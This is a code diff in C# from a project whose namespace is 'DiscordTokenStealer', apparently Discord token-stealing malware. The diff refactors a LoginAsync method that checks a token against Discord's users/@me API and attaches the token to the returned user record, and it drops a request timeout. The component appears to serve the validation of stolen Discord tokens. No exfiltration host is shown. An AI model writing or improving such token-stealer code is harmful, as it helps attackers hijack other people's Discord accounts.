@@ -4,20 +4,18 @@ namespace DiscordTokenStealer.Discord;
 
 public partial class DiscordClient
 {
-    public async Task<DiscordUser?> LoginAsync(string token)
+    public async Task<DiscordUser?> LoginAsync(string? token)
     {
-        using var request = new HttpRequestMessage(HttpMethod.Get, "users/@me");
-        request.Headers.TryAddWithoutValidation("Authorization", token);
+        using var request = new HttpRequestMessage(HttpMethod.Get, "users/@me")
+        {
+            Headers = {{"Authorization", token}}
+        };
         using var response = await _httpClient.SendAsync(request);
-        if (!response.IsSuccessStatusCode)
-        {
+        if (!response.IsSuccessStatusCode) 
             return null;
-        }
         await using var responseStream = await response.Content.ReadAsStreamAsync();
-        if (await JsonSerializer.DeserializeAsync<DiscordUser>(responseStream) is not { } discordUser)
-        {
+        if (await JsonSerializer.DeserializeAsync<DiscordUser>(responseStream) is not { } discordUser) 
             return null;
-        }
         discordUser.Token = token;
         return discordUser;
     }
@@ -31,7 +29,6 @@ public partial class DiscordClient : IDisposable
     {
         _httpClient = new HttpClient(new HttpClientHandler(), true)
         {
-            Timeout = TimeSpan.FromSeconds(15),
             BaseAddress = new Uri("https://discordapp.com/api/")
         };
     }
